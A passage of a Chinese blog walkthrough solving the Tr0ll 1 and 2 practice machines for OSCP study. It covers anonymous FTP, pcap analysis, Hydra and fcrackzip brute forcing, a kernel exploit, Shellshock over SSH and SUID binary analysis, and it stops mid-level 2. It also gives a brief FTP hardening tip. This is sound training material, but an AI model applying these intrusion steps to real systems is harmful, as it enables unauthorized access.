#  【oscp】Tr0ll 靶机全系列（1-3），FTP被玩坏了   
原创 仙草里没有草噜丶  泷羽Sec   2025-01-03 23:44  
  
##### ~ 历遍山河，仍觉人间值得 ~  
  
## Tr0ll level 1  
  
这里是综合的，前两篇已经发过了1和2，可以直接跳过这里，看level 3，，当然也可以回顾回顾思路，考试的时候指不定就忘了  
  
靶机1，主要是利用了ftp匿名登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu1M8brJriaaLVXtickHwG0kfcTuMDDEHgDQ4sxLvZcqp8ausa1GrEVEPA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224010611985  
  
允许匿名登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccubygu8VoMgicBKYmAcscQAwUhDQv1wtlE0BlicwqSgScOV4xAlpFxYTFg/640?wx_fmt=png&from=appmsg "")  
  
image-20241224010638152  
  
再看看网页的东西  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuACvuicWld5yzXDw4UY2JZwYPhibDx1kVnQ4xWpsPDcSy5pFib8UQDpZSA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224001734622  
  
插件看到一个phpmyadmin数据库管理器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccup5C3ntqnMGjJuhxJ8sSGTDsiaeNdTvC5eWnEUrGiaLmgMEqzxWLndUmg/640?wx_fmt=png&from=appmsg "")  
  
image-20241224002150291  
  
但是目录扫描的结果中没有任何phpmyadmin相关的东西  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuuYOOFoVsSZ6RTGeP66MUsHzGs4OUmLyeU81zIvYLyfaJNe5ibvBg5BA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224010726794  
  
只有这两个撒比图片  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccuk1swLryOdLGpUZ8uhaqx7JYgz4V7fAhJK2k6fwicvRo0byVfhVsZ8SQ/640?wx_fmt=png&from=appmsg "")  
还有一个robots.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuoTtEhicx1JW7Mkd40ibzLGFicr2rBXhTAqvI5v6WkVs1kS84psCeG81pg/640?wx_fmt=png&from=appmsg "")  
  
image-20241224011011653  
  
那么只能使用刚刚nmap扫描出来的ftp匿名登录了，密码为空即可登录目标ftp服务器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcunPibzmF8NUGOOO4L5Kt87o2P8vf6WoicfibNfn22GJW1ImYz3KvEvhp6A/640?wx_fmt=png&from=appmsg "")  
  
image-20241224011156563  
  
有一个lol.pcap流量包，我们使用大鲨鱼打开看看，下面是ftp下载的命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcucqydqbPPpJpObV0b7SibMrzeqoDAd6tDlT0TGKVnTsv7YaZy7ff1qJA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224012339704  
  
用大鲨鱼打开，赛选ftp的协议，可以看到登录ftp的账号密码 anonymous / password  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu5XLfxp4FCUyXqJ46hxibGqumnwoW6Id4QohkJyWBouRhfktsZlrd5Og/640?wx_fmt=png&from=appmsg "")  
  
image-20241224012511274  
#### 流量分析  
  
这里服务器使用了syst命令，查看系统信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuIGnvsIAbI5dBBeM4FCkDs6d6icWkJnVt2v8X8UIMvDEIhNOE4BKzjEQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241224014840581  
  
215 ：这是一个状态码，表示请求成功。  
  
UNIX Type：L8 ：这是服务器的操作系统类型  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuFFVsk1iaFg8SRT9PO90TyIhIeKpibQU3cpLVXr22WEiapVx0icDMm8ibDBA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224030049793  
  
PORT 10,0,0,12,173,198 （让服务端连接客户端的44486端口）  
> 白小羽  
> 为什么是44486端口？  
> 先观察这6位数，前四个和ip地址很像，说明这就是IP地址，实际的数据交互的端口应该是后面两个数构成。  
> 这里是用第五个数乘以256 再加上第六个数，这时候就得到了实际的端口号（173x256+198=44486）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuwicZd8x61nVMgjDx4dZByiaK1A4nRtDJ6u7qeL7uM5QpaGLhKmGDrulQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241224030418018  
  
响应结果为 command successful. Consider using PASV.  
  
继续分析  
  
命令 LIST （命令用于列出指定目录中的子目录和文件信息，如果没有指定目录的名字就默认列出当前目录下的所有子目录和文件信息，并返回给客户端。），红框中是返回结果，是有一个文件的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuFcIY6LEvb8t5qDgsrnSVBVYNW7fouqUTmZ5NIJIw58cOibakggvmkLA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224031513413  
  
命令：TYPE I (I 文件传输类型为二进制 ; A 文件传输类型为ASCII)
返回结果：Switching to Binary mode.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuWia5lfF1mR6ibWpAO9wdkoo6l7OObzib0nL3OstdEeCzdXzaAmuXQQGuw/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033154477  
  
和刚刚一样的命令：PORT 10,0,0,12,202,172 （客户端请求服务端，让服务端连接客户端51884端口）
返回值：PORT command successful. Consider using PASV.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuOmYqhnd0U1lbfnwr9Rjda8NfkB0UVmlmhw9J51AqlLNQmibibsfGMib0g/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033254849  
  
命令：RETR secret_stuff.txt （下载secret_stuff.txt）
返回值：Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol 😛
Sucks, you were so close… gotta TRY HARDER!
好吧，好吧，好吧，你不就是个聪明的小恶魔吗，你差点就找到了sup3rs3cr3tdirlol:-P
太糟糕了，你离得太近了……要更加努力!  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuHo9LBI0kMYCNibcWzX9J5El5iaylUCjn26pRhHO9KJMupxbh1uFxXLoA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033356732  
  
再自己找找，找到网页上来了，这里有一个二进制文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuVeGT0x3tTbvMcPd1WicH25g0v3x3KOuj5NZEDNPsVb4HGhwYD5Tic0lQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033544473  
  
下载下来看看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuasePjg7ckwhfIEnajzMoJlzDOPE20369Uxp58AEDsjvKoGI6icJvf8g/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033755376  
  
让我们找到这个 0x0856BF 这个地址，继续  
```
Find address 0x0856BF to proceed

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuKLdjicW4A9UcAztfHCCbWPiccOAWTPjgnzCja1DcHNp3L1UWw2ptAUsA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033850469  
  
good_luck文件夹中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuOHLvyPLbibWXI1RgD5jaU1exsicAOI4cF6u1XpfoFxVWpOBZEQLoA2UQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241224033916868  
  
this_folder_contains_the_password文件夹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcudV6VIQqe0Bahug67dAYfj9S73U33ibFQgibUedoyKAMpoxx77ZHgsWeA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224034200670  
  
我们使用海德拉爆破，这里很奇葩，密码为 Pass.txt 密码文件名称就是ssh的密码，指定密码文件那个笑脸，都是错误的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcusJDpuRAD5MCEtUYCc3iadw6M3JX0QGJ2oJJibm6XObunT8oibKVd0GPSA/640?wx_fmt=png&from=appmsg "")  
  
image-20241224035127441  
  
切换终端，收集内核信息，ubuntu版本很低，很大可能存在内核提权漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccuubj44OxEEhlppNV9uVulStNpMYIDVibzM18p9uRAYHGRQAwg0yjbD3g/640?wx_fmt=png&from=appmsg "")  
  
image-20241224035400124  
  
符合条件的两个，一个是c文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuXt86n7JNbqburg2eibiagHyAQuXkfTUQME2WoO4qbzicQSZFNVqibyGhHg/640?wx_fmt=png&from=appmsg "")  
  
image-20241224035727429  
  
把他复制到当前目录下，尝试编译，本地不行，放到靶机上去  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuCC14VfL3qykQ802FFCHD5WhBhR4qfVUemyRCu6jgtbXmDnn7wJl0cw/640?wx_fmt=png&from=appmsg "")  
  
image-20241224040141210  
  
提权成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcufmaEql79QwtWg8PibsWRnVqn09MwPUXMjQicV1aTQ72j5BfYhCM8lDTw/640?wx_fmt=png&from=appmsg "")  
  
image-20241224040125712  
#### 防止ftp匿名登录  
  
在 FTP 服务器（如 vsFTPd、ProFTPD 等）上配置匿名登录通常涉及以下步骤：  
1. **编辑配置文件**：找到 FTP 服务器的配置文件（例如 /etc/vsftpd.conf）。  
  
1. **启用匿名访问**：确保以下配置项被设置为拒绝匿名访问：plaintext anonymous_enable=NO  
  
1. 设置匿名用户的根目录：指定匿名用户可以访问的目录：plaintext  
```
anon_root=/path/to/anonymous/directory ```

```  
  
  
1. **重启 FTP 服务**：保存配置后，重启 FTP 服务以使更改生效：  
```
sudo systemctl restart vsftpd

```  
  
  
## level 2  
  
主机发现，80探测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuLgMHh5lBe0ZVNm1zo9CPFNScel95cA6d9eY7G9yvr1ibC2ia2KibPGslQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225014511262  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuMsoOFVsmo7ojw7icPibX2ffPRFz0Fsqnhz6kxhDrAhTuVuiaAm0Oia4vJA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225122303182  
  
端口syn扫描，没有啥利用信息了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcupMnfgFnD8fSicbrNhicmZPBcr0yuhv1SUWCNfhI138CUDdy6M2rcga1Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241225014613626  
  
和上一关一样，使用ftp匿名登录试试，失败  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuVgM6ba1aX69vHuib2SRZp53Syc9lXogFiaiafoqqfM4py5PveA4SvmbRw/640?wx_fmt=png&from=appmsg "")  
  
image-20241224234048334  
  
目录扫描  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcueVXicTOib6Ljn8Wh3gicARBqQicQDaSW4JADxd0UKgxWszZMYIcT1D13VA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225122407532  
  
访问robots.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuWjrib3Oy14icugp9MT9V4oAUhsic0h8KqnGxTSLeCllBRr1zKAZKhDo7g/640?wx_fmt=png&from=appmsg "")  
  
image-20241225122502801  
  
noob，keep_trying，dont_bother，ok_this_is_it  
  
都是这个母老虎  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccurf5J9npFS7318ia2EHusHqmhBPq1p3lTK3HzibtdFGqQhVyXCrkbEiamg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225122654010  
  
源码What did you really think to find here? Try Harder!，这几个母老虎的源码都是这个提示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuSqxYicIyQqKNdzQIrbTIGJOYySxXWia5yu9tJpO9LicMiaVDtywVxcFUeQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225123036952  
  
返回主页，查看源码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcumrOdlnWOll579GwQHyC8RnEJWQcCicDUEgFAAG232rYnJXgkKoFRhzg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225123158630  
  
登录失败  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CculHNwMBSS0I2ibrFQk0cstBpRsJiay2B611M3nGJf89tpibuFoNZibVbkuQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225123442524  
  
普通ftp用户不行，那就换作者的Tr0ll，账号密码都是Tr0ll  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu7l6WiavpJbpBibRkTUvp4fytFHnlfiaNicfYlu4jLeSoDfla3414ib3Vlrw/640?wx_fmt=png&from=appmsg "")  
  
image-20241225124411431  
  
目录枚举，下载下来  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu6QbtCt23Q4KZiaHcMZ6RNdtibKyxuTDps46IMGiaGADSG1tg41vwZE3Kg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225124502060  
  
尝试各种方法后，也找不到这个密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuHM5FjGx1oLWx8939Bv9g04mXSRX63ibkVYM3dWrlVA0bDOeAEqh095Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241225125517841  
  
那么只剩下一个方法了，从这两个图片入手  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcumkVZqm2U82T6ejpUNfPSm4ZVBUGVzJNkfbJBJtyVVxxkVF7lpibG3Hg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225125822896  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuEkpia8PU2DXjNjxRcgLfInaA1ukmLTNHTgmoWrQJtzTuib8nSIhnwvbA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225125838671  
  
下载就行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuH2w20JHAicC6UUIQGBw13exNLqDjOqgdSlQMExE9jF5CH4ibVbibicqtvA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225184334108  
  
这里下载的是这张图片  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu0z9IujRV96XIeZClllTdU8h9QCuo0CzMekTs1gxwXibiaeKYPKH4eXMQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225184907450  
  
这张图片啥也没有  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuQrxjA12taQibSZyl3y4SdXNOiafrw562iaQib9SeMBNGTibUQP61YmJfoOg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225184921945  
  
仔细分析图片的路径就能清楚了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccus1FcUkHeUHUK7v9BzxYSyNBPfxVMegNTgmGkkDRYXo4xxxjI11TT9w/640?wx_fmt=png&from=appmsg "")  
  
image-20241225185504770  
  
然后根据robots的路径，找到如下图片  
```
http://192.168.111.191/dont_bother/cat_the_troll.jpg

```  
  
最终找到一个消息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcupZG5FZZcGVfr9Lkkdyvyv08OSzPdMtwibQQVS4AdkAC5rrp0DuRk5BQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225185335409  
  
Look Deep within y0ur_self for the answer（从 y0ur_self 处寻找答案），回到网页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcubpXaT7SiczVuZheINia7FAjIZlX68xdQ2icdzib20MvkH8e1PskLhApUZQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225185803073  
  
泄露了一个密码字典  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuaIIKOyeTpgQ72b8fxt7ZbynzdyDMQdGwW1flOO6RDaQp5BHdHEtEmw/640?wx_fmt=png&from=appmsg "")  
  
image-20241225185820391  
  
爆破（apt install fcrackzip）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuLfqjBgGaUltwfpLiaChJqSWSn5KnlPvjIMqw1km5I0AjAYjrb0CKqGg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225191653746  
  
失败的，就不等了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcunF3p6tQ3ll6jkHlzLibwnSoPHKPdibd2Po6gq4L0gGBWMZMELWpaiaYWg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225191406589  
  
看样子是base64的一个编码，我们去解码一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuAspWoJscE64xBQ1bbIT523uUMoYzR4DuGLGbB2gTbBzlZyibCHxWOjQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241225190758947  
  
用base -d解码这个文件，并重定向到pass.txt中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcumKPic7aLTIneRW0g6Pkia882g8PxtlN3ibxzicehp0zkwiazakNPKjzicN9g/640?wx_fmt=png&from=appmsg "")  
  
image-20241225191222272  
  
然后再爆破，找到了zip的密码  
  
ItCantReallyBeThisEasyRightLOL  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuQNZfWopygPep4WmtNcY5sYVxSUdAZPb2qWtn5x1HcjZJCUaJfSEsHA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225191631793  
  
一个ssh密匙，RSA  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuwYN2IDYBp6zyV8NavXDbyxOKCXO5KiajLr1S6zVgFCgcqDHo1ib7sBNA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225191800218  
  
有了密匙，就可以登录服务器了，不支持互相签名（就是不让你登录）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuJEKjVXsUB28boI4uQOPlxPbNFyHVbAUNhRcTSqK5ZqPcr7rMuUZJow/640?wx_fmt=png&from=appmsg "")  
  
image-20241225192342671  
  
提示了sign_and_send_pubkey: no mutual signature supported，表示SSH连接时，客户端和服务器之间无法就公钥认证使用的签名算法达成一致。此时我们要加上一个 -o 参数  
```
ssh -i noob -o "PubkeyAcceptedKeyTypes=ssh-rsa" noob@192.168.111.191

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuRRE7YMBAnQBIGLf6aDIlo7wFyl3TgUMMDajrDsIRKAsVUFzxe6iaiblw/640?wx_fmt=png&from=appmsg "")  
  
image-20241225222302743  
  
不让登录，平时的利用方式就没有了，这里有一个shellshock env环境变量绕过ssh的漏洞  
  
Shellshock，又称Bashdoor，是Unix中广泛使用的BashShell中的一个安全漏洞，首次于2014年9月24日公开。shellshock Bash漏洞利用CVE-2014-6271被利用！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu14pL5q5cNXkKPicHKn22U01KfDbPnoN5s2Ageicshe9jnyOpzibvUfJZg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225203231717  
  
关键字Shellshock，Remote（远程）因为我们有了私匙，只能进行远程的漏洞利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcurB6XyjkKIg82vXiahLqRVtkt5HjjDKcicNbEPf4D0b9iaEJDDFh3PeVpA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225223637899  
  
第一个payload，这是一个正反向连接的payload，看到一个SSH-2.0，，，，，目前收集到的信息，大概率不是这个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuxL6ibbLkE42WRzNLSlH5UuIrJLyeT8QepiaXaeSU3m3kCCPOIianItAJg/640?wx_fmt=png&from=appmsg "")  
  
image-20241225233504930  
  
搜第二个，msf的脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CculODHaCBwS6vDlhv6auHxlupoianiaHnZS00eMCtYSrQnuXj5fMYBS2qw/640?wx_fmt=png&from=appmsg "")  
  
image-20241225233113901  
  
貌似是可以执行命令的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuhoMSqTNYiaKZJpLgSpAiaFAtnZ0J533NXibQDia86K419n0njD9iaiaxviaHA/640?wx_fmt=png&from=appmsg "")  
  
image-20241225235600063  
  
这时候可以利用ssh执行命令测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu00ia4plQwbpDibggx33r5UGvXU3mdONAehJnwgwX9ZvibA5ZJc4yWSp1g/640?wx_fmt=png&from=appmsg "")  
  
image-20241226000357781  
  
成功了，内网信息收集，低版本的系统  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcufjFmKeqiaNNgK5riaG4ano4MP6oRZrTaIfSCF8ghgZ8TNfZxWgANXLGA/640?wx_fmt=png&from=appmsg "")  
  
image-20241226000700066  
  
筛选出了这个结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuaoVYrO9n6p5OfuJkxpcEUzUQibvKo9UF5xrbiaqwUZhVAkLNJjhDspLA/640?wx_fmt=png&from=appmsg "")  
  
image-20241226000910427  
  
使用方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuKEZ5k85aljyH2uib6hRoF1dlvvJuCxSib8UqvvnBDa6uiarD7icnr551icw/640?wx_fmt=png&from=appmsg "")  
  
image-20241226001914032  
  
我们的靶机，一个23，一个29，很明显，不适用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcurIR3ah6hSJAqFQvhyIm5Z0MwJFbmzXEfc7kmvajqyFqP4AMS4X871g/640?wx_fmt=png&from=appmsg "")  
  
image-20241226001951364  
  
已经替你们试过了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuA0OrreQYzqWvYlERqh5Wwkg1RsU3WkPFUSR2kh9RT7JHXSs9YkxsNw/640?wx_fmt=png&from=appmsg "")  
  
image-20241226002039814  
  
查找指定用户的文件，也没有利用方式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccun4R7vKJbRUHImSMhGSjGznRJqQJdnbrvUWjDicMzh4Hrib0pELdYHY2Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241226002726350  
  
回家的路  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CculBK4RNGic67dZjLlpWqTib5OnfFjribuz1jKjYR7CnZLIXGovib4gztuxQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241226002857786  
  
SUID  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuP26xG3kBWaqW0jCPz3FSMNupCxpFB5tuH1RwRBgm1X4LjooBlheP0g/640?wx_fmt=png&from=appmsg "")  
  
image-20241226002342726  
  
suid提权一个个找呗（啥利用方式也没有）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu0UF4XvYnLJ5KWlfsLKoxej5iaGu68bUzs49IbpyGiadJlDwA93BbiaUOA/640?wx_fmt=png&from=appmsg "")  
  
image-20241226002326407  
  
有这些东西  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuRYIQJoO56Ybf2icryA9ZZwoDWF6pU22E7ko1h47v2mGOX1IwHOAV4oA/640?wx_fmt=png&from=appmsg "")  
  
image-20241226214633052  
  
切换根目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu3NN6HPj4svPGRJmYK0F182bxKgEo8qcpdXrRrXkYeOUG3CFMCypStw/640?wx_fmt=png&from=appmsg "")  
  
image-20241226003011055  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuQEOzQZYcDs3eice0bViact2012ibLPcX82lXqS93ibNvZuroRG9uMe0fog/640?wx_fmt=png&from=appmsg "")  
  
image-20241226002950219  
  
看到三个门  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuicctO74ko5oHv42MxMV8lVPfFkNCnDcuTlpytTHXgmrI7JhpJ8LBEkw/640?wx_fmt=png&from=appmsg "")  
  
image-20241226003036284  
  
第一个门，自动重启了。。。。。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcumzlBJfAdW8Nv0ks72jKlMC0fjaGDdWaw43QSQHDE0vZ8DdvbGsFZ3A/640?wx_fmt=png&from=appmsg "")  
  
image-20241226003233450  
  
两分钟的困难模式，就是不让我输入命令了，把我给锁了两分钟。。。。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuMdXLHEjG0wib56hTgg5EJgqDdicQicdlpbrR8v8bxLwakXgBaQkmn9kgg/640?wx_fmt=png&from=appmsg "")  
  
image-20241226003348336  
  
查看信息，三个门都是root的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccug5icEbtcFKvTpib9b918ic2acI2XR8xibgA9q8Nto10HjlllBYFzxvrFFw/640?wx_fmt=png&from=appmsg "")  
  
image-20241227031949889  
  
这里要用到一个工具GDB，全名叫做（GNU Debugger）是一个强大的开源调试器，主要用于调试编写在 C、C++、Fortran 等编程语言中的程序。  
  
显示给定函数（main）的反汇编代码，main函数一般是一个程序中的主函数  
```
disas main 

```  
  
door3  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuXQcFyIHlTyicDnvaW3v5bTqWkgz0VTUIhGngviadUeibZss5uSicdwxDFQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241227032559066  
  
door2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcumM4gQeYiaKltNQIW7Y4JicWLBrlTgv7QkeHdGQTEibBKmK9NHB53icOohA/640?wx_fmt=png&from=appmsg "")  
  
image-20241227032851104  
  
door1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccuk1TtFfYHicW5tXZQicJKtWX7nUt0CGpJO0y1q2mcqLicgxciccfsZicZwkw/640?wx_fmt=png&from=appmsg "")  
  
image-20241227032911609  
  
发现了第二个door可能存在缓冲区溢出的漏洞，strcpy 函数详细  
  
